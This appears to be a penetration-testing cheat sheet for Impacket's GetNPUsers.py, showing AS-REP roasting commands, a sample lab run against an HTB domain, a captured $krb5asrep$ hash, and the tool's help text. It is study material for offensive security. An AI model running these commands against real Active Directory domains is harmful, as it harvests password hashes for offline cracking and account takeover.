# Impacket - GetNPUsers.py

This script will attempt to list and get TGTs for those users that have the property, `Do not require Kerberos preauthentication` set (`UF_DONT_REQUIRE_PREAUTH`).
For those users with such configuration, a John The Ripper output will be generated so you can send it for cracking.

## Example:

```bash
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

### Enum user:

```bash
$ impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2022-07-01 09:58:43.840007  2019-09-23 12:09:47.931194  0x410200
```

### Crack Hash - Hashcat

**Need option**

`-format` : Select `hashcat` or `john` .

`-request`: Requests TGT for users and output them in JtR/hashcat format (default False).

```bash
$impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -format hashcat -request
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2022-07-01 10:01:34.902827  2019-09-23 12:09:47.931194  0x410200



$krb5asrep$23$svc-alfresco@HTB.LOCAL:94bd35adb7731d64f7d16fbb753d7a04$84ed0c8b050f0a070b688182f6284564bae4ecfc5f4485f3b73e914f1daaa34b66165bdf558974da11208a984d7656e7c596a472e9463a73151cee687d8975aa626eb148f6036c99dca35e0a21cc1d644cc89e6268e36b2be7f40af78e51803de412c395c7d1ccdda5b5ee15e67e1dd0c3e398bc1dfc8688ddca3508968711d9d09735e705f20812b6ade6ec58b9f459413b7afa16ef9dcdced04479a93768f83e42da03f95cbdf1159f17ce01f133dfabf66bf8981d9818426ad1a7118fc7a433eb12274db826c388712468be042af2215e6f16ebd6cabfb873f1a2de1ae0c475554dbf3746
```

## Tools manual

```bash
$impacket-GetNPUsers
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug]
                     [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                     target

Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

positional arguments:
  target                domain/username[:password]

optional arguments:
  -h, --help            show this help message and exit
  -request              Requests TGT for users and output them in JtR/hashcat format (default False)
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format
  -format {hashcat,john}
                        format to save the AS_REQ of users without pre-authentication. Default is hashcat
  -usersfile USERSFILE  File with user per line to test
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target
                        parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target
                        parameter

There are a few modes for using this script

1. Get a TGT for a user:

        GetNPUsers.py contoso.com/john.doe -no-pass

For this operation you don't need john.doe's password. It is important tho, to specify -no-pass in the script,
otherwise a badpwdcount entry will be added to the user

2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set

        GetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily

This will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set.
However it will require you to have emily's password. (If you don't specify it, it will be asked by the script)

3. Request TGTs for all users

        GetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily

4. Request TGTs for users in a file

        GetNPUsers.py contoso.com/ -no-pass -usersfile users.txt

For this operation you don't need credentials.
```
